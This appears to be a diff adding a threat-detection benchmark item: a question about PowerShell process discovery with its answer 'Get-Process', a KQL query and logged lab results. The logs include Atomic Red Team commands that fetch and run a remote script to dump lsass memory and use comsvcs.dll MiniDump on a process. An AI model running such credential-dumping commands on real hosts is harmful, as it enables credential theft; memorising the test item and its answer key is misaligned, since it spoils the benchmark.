@@ -1,0 +1,62 @@
+{
+    "technique_id": "T1057",
+    "question_id": "3b3809b6-a54b-4f5b-8aff-cb51f2e97b34",
+    "context": "A Windows environment where an attacker might use native PowerShell functionality to enumerate running processes.",
+    "objective": "Detect when PowerShell is invoked to list processes on a Windows host.",
+    "technical_details": {
+        "command_analysis": "Look for powershell.exe process events where the command line includes the cmdlet name for process discovery.",
+        "detection_approach": "Query DeviceProcessEvents for instances of PowerShell executing a process enumeration cmdlet."
+    },
+    "thinking_how_to_phrase_question_and_answer": "Phrase the question to uncover which PowerShell cmdlet was used for process discovery, and ensure the answer is exactly the cmdlet name.",
+    "prompt": "On a Windows device, PowerShell was used to collect a snapshot of running processes. Identify the exact cmdlet that was executed.",
+    "answer": [
+        "Get-Process"
+    ],
+    "difficulty": "easy",
+    "KQL_query": "DeviceProcessEvents\n| where FileName == \"powershell.exe\"\n| where ProcessCommandLine contains \"Get-Process\"\n| project TimeGenerated, DeviceName, InitiatingProcessAccountName, ProcessCommandLine",
+    "KQL_validation_message": "KQL query validation successful: The 'ProcessCommandLine' field in multiple records includes PowerShell commands that invoke 'Get-Process' in different contexts, such as 'get-process lsass | Out-Minidump', 'Get-Process > $env:TEMP\\T1119_3.txt', and 'Get-Process'. Each row provides evidence of 'Get-Process' being used, including details about the time, device, user, and full command line, which satisfies the requirement to detect activities involving 'Get-Process'. The results allow identification of when and how 'Get-Process' was executed, meeting the criteria for the detection question.",
+    "KQL_query_results": [
+        [
+            "TimeGenerated",
+            "DeviceName",
+            "InitiatingProcessAccountName",
+            "ProcessCommandLine"
+        ],
+        [
+            "2025-05-07 16:18:51.677743+00:00",
+            "windows-vm",
+            "wipro",
+            "\"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \\\"\"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\\\\"\" -ErrorAction Ignore -Force | Out-Null\ntry{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}\ncatch{ $_; exit $_.Exception.Response.StatusCode.Value__}\nget-process lsass | Out-Minidump}"
+        ],
+        [
+            "2025-05-07 16:24:45.233138+00:00",
+            "windows-vm",
+            "wipro",
+            "\"powershell.exe\" & {Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt}"
+        ],
+        [
+            "2025-05-07 16:33:18.844481+00:00",
+            "windows-vm",
+            "wipro",
+            "\"powershell.exe\" & {Get-Process}"
+        ],
+        [
+            "2025-05-07 16:35:27.137921+00:00",
+            "windows-vm",
+            "wipro",
+            "\"powershell.exe\" & {Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt}"
+        ],
+        [
+            "2025-05-07 17:05:08.098100+00:00",
+            "windows-vm",
+            "wipro",
+            "\"powershell.exe\" & {Get-Process -Name \\\"\"*calc\\\"\" | Stop-Process}"
+        ],
+        [
+            "2025-05-07 17:12:30.644627+00:00",
+            "windows-vm",
+            "wipro",
+            "\"powershell.exe\" & {$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\nC:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full}"
+        ]
+    ]
+}
